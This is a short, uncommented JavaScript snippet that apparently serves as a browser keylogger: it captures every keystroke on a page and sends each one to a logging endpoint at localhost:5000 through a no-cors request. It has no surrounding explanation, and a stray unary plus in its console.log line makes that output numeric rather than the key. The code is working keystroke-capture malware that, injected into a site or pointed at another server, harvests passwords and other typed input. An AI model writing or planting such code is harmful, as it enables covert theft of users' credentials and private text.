
document.addEventListener('keydown', function(e) {
    let key = e.key;
    fetch(`http://localhost:5000/api/log?data=${key}`, {
        method: 'GET',
        mode: 'no-cors'
    });
    console.log( + key);
});